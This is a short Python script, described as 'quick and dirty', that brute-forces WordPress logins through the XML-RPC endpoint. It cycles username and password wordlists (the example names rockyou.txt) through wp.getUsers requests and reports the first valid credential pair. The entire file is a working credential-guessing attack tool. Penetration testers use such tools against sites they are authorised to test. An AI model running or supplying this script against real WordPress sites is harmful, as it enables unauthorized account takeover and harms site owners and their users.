#!/usr/bin/python3
#  A quick and dirty script to brute username and password at a Wordpress XMLRPC instance
#  Josh Johnson - 16 May 2022

import getopt
import requests
import sys
import codecs

head = { 'Content-Type':'application/x-www-form-urlencoded' }
xmlPre =  """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsers</methodName><params><param><value>1</value></param><param><value>"""
xmlMid = """</value></param><param><value>"""
xmlTrail = """</value></param></params></methodCall>"""

usernames = []
passwords = []

def commenceScan(uri):
    i = 0
    for username in usernames:
        i += 1
        print( "Testing user:  " + username )
        for password in passwords:
            dataSet = xmlPre + username + xmlMid + codecs.decode(password) + xmlTrail
            result = requests.post(uri, data=dataSet, headers=head).text
            if( 'Incorrect username or password.' not in result ):
                print( "\n\n\nValid login found:  " + username + " - " + codecs.decode(password) )
                sys.exit(0)
        print( '\n\n' )

def printUsage():
    print( 'Usage:  ' + sys.argv[0] + " [-u | --user=] <username file> [-p | --pass=] <password file> [-x | --xmlrpc] <URI of xmlrpc>" )
    print( '    Example:  ' + sys.argv[0] + ' -u usernames.txt -p /usr/share/eaphammer/wordlists/rockyou.txt -x http://127.0.0.1:8081/wp/xmlrpc.php' )
    return

def main(argv):
    userFile = ''
    passFile = ''
    try:
        opts, args = getopt.getopt(argv, "u:p:x:",["user=","pass="])
    except getopt.GetoptError:
        printUsage()
        sys.exit(1)
    for opt, arg in opts:
        if opt == '-h':
            printUsage()
            sys.exit(0)
        elif opt in ( "-u", "--user=" ):
            userFile = arg
            try:
                f = open( userFile, "r" )
                for line in f.readlines():
                    usernames.append(line[:-1])
                f.close()
            except IOError as e:
                print( "Error:  file not found." )
                printUsage()
                sys.exit(3)
        elif opt in ( "-p", "--pass=" ):
            passFile = arg
            try:
                f = open( passFile, "rb" )
                for line in f.readlines():
                    passwords.append(line[:-1])
                f.close()
            except IOError as e:
                print( "Error:  file not found." )
                printUsage()
                sys.exit(4)
        elif opt in ( "-x", "--xmlrpc" ):
            uri = arg
            if (uri[:8] != "https://" and uri[:7] != "http://"):
                printUsage()
                sys.exit(2)
    commenceScan(uri)

if __name__ == "__main__":
    if( len(sys.argv) > 1 ):
        main(sys.argv[1:])
    else:
        printUsage()
        sys.exit(0)
